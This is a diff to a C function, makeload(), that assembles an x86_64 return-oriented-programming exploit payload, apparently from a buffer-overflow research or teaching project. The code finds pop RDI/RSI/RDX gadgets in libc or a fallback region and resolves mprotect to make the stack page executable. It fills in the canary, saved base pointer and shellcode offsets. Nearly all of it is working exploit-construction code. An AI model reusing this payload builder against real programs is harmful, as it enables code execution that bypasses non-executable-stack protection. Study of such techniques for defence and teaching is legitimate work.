@@ -14,54 +14,55 @@ void initload(PayloadPtr plp) {
 } // initload()
 
 ssize_t makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np) {
-	size_t libc_size	= getpagesize() * 100; // Punt
+	size_t libc_size = getpagesize() * 100;	// Punt
+	size_t fbg_size  = getpagesize() * 1;	// Punt
 
-	char s_libc_popRDI[]	= {0x5f, 0xc3, 0};
-	char s_libc_popRSI[]	= {0x5e, 0xc3, 0};
-	char s_libc_popRDX[]	= {0x5a, 0xc3, 0};
+	// Gadgets as strings (x86_64)
+	char s_popRDI[]	= {0x5f, 0xc3, 0};
+	char s_popRSI[]	= {0x5e, 0xc3, 0};
+	char s_popRDX[]	= {0x5a, 0xc3, 0};
 
-	Pointer	libc_popRDI	= strnstr(baseAddressesPtr->libc_base, s_libc_popRDI, libc_size);
-	Pointer	libc_popRSI	= strnstr(baseAddressesPtr->libc_base, s_libc_popRSI, libc_size);
-	Pointer	libc_popRDX	= strnstr(baseAddressesPtr->libc_base, s_libc_popRDX, libc_size);
+	// First try to find gadgets libc
+	Pointer	libc_popRDI	= strnstr(baseAddressesPtr->libc_base, s_popRDI, libc_size);
+	Pointer	libc_popRSI	= strnstr(baseAddressesPtr->libc_base, s_popRSI, libc_size);
+	Pointer	libc_popRDX	= strnstr(baseAddressesPtr->libc_base, s_popRDX, libc_size);
 
+	// Next, get backup gadgets from fallbackGadgets()
+	Pointer fbg_popRDI	= strnstr(baseAddressesPtr->fbg_base, s_popRDI, fbg_size);
+	Pointer fbg_popRSI	= strnstr(baseAddressesPtr->fbg_base, s_popRSI, fbg_size);
+	Pointer fbg_popRDX	= strnstr(baseAddressesPtr->fbg_base, s_popRDX, fbg_size);
+
+	// Things are wrong if I don't find the gadgets in fallbackGadgets()
+	assert(fbg_popRDI != NULL);
+	assert(fbg_popRSI != NULL);
+	assert(fbg_popRDX != NULL);
+
+	// We will need "mprotect()"
 	Pointer	libc_mprotect	= dlsym(RTLD_NEXT, "mprotect");
-
-	// Offsets are relative to the payload
-	baseAddressesPtr->buf_base = plp;
-
-	plp->pl_dst.o		= indirectToOffset(&plp->pl_dst, 'B', baseAddressesPtr);
-	plp->pl_canary.o	= indirectToOffset(&plp->pl_canary, 'B', baseAddressesPtr);
-	plp->pl_rbp.o		= indirectToOffset(&plp->pl_rbp, 'B', baseAddressesPtr);
-	plp->pl_popRDI.o	= libc_popRDI?pointerToOffset(libc_popRDI, 'L', baseAddressesPtr):pointerToOffset(&&l_popRDI, 'P', baseAddressesPtr);
-	plp->pl_stackPage.o	= pointerToOffset(baseAddressesPtr->stack_base, 'S', baseAddressesPtr);
-	plp->pl_popRSI.o	= libc_popRSI?pointerToOffset(libc_popRSI, 'L', baseAddressesPtr):pointerToOffset(&&l_popRSI, 'P', baseAddressesPtr);
-	plp->pl_stackSize	= getpagesize();
-	plp->pl_popRDX.o	= libc_popRDX?pointerToOffset(libc_popRDX, 'L', baseAddressesPtr):pointerToOffset(&&l_popRDX, 'P', baseAddressesPtr);
-	plp->pl_permission	= 0x7;
-	plp->pl_mprotect.o	= pointerToOffset(libc_mprotect, 'L', baseAddressesPtr);
 
 	plp->pl_shellCode.o	= pointerToOffset(&plp->pl_scu, 'B', baseAddressesPtr);
 
-	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
-	int volatile v = 0;
+	// Buffer offsets are relative to the payload
+	baseAddressesPtr->buf_base = plp;
 
-	if (v) {
-l_popRDI:	// Fallback gadget for "POP RDI"
-		__asm__ ("pop %rdi");
-		__asm__ ("ret");
-	} // if
+	plp->pl_dst.o		=	indirectToOffset(&plp->pl_dst,			'B', baseAddressesPtr);
+	plp->pl_canary.o	=	indirectToOffset(&plp->pl_canary,		'B', baseAddressesPtr);
+	plp->pl_rbp.o		=	indirectToOffset(&plp->pl_rbp,			'B', baseAddressesPtr);
+	plp->pl_popRDI.o	= libc_popRDI?
+					pointerToOffset(libc_popRDI,			'L', baseAddressesPtr):
+					pointerToOffset(fbg_popRDI,			'F', baseAddressesPtr);
+	plp->pl_stackPage.o	=	pointerToOffset(baseAddressesPtr->stack_base,	'S', baseAddressesPtr);
+	plp->pl_popRSI.o	= libc_popRSI?
+					pointerToOffset(libc_popRSI,			'L', baseAddressesPtr):
+					pointerToOffset(fbg_popRSI,			'F', baseAddressesPtr);
+	plp->pl_stackSize	=	getpagesize();
+	plp->pl_popRDX.o	= libc_popRDX?
+					pointerToOffset(libc_popRDX,			'L', baseAddressesPtr):
+					pointerToOffset(fbg_popRDX,			'F', baseAddressesPtr);
+	plp->pl_permission	=	0x7;
+	plp->pl_mprotect.o	=	pointerToOffset(libc_mprotect,			'L', baseAddressesPtr);
 
-	if (v) {
-l_popRSI:	// Fallback gadget for "POP RSI"
-		__asm__ ("pop %rsi");
-		__asm__ ("ret");
-	} // if
-
-	if (v) {
-l_popRDX:	 // Fallback gadget for "POP RDX"
-		__asm__ ("pop %rdx");
-		__asm__ ("ret");
-	} // if
+	plp->pl_shellCode.o	=	pointerToOffset(&plp->pl_scu,			'B', baseAddressesPtr);
 
 	return makeShellcode(&plp->pl_scu.sc, p, np);
 } // makeload()
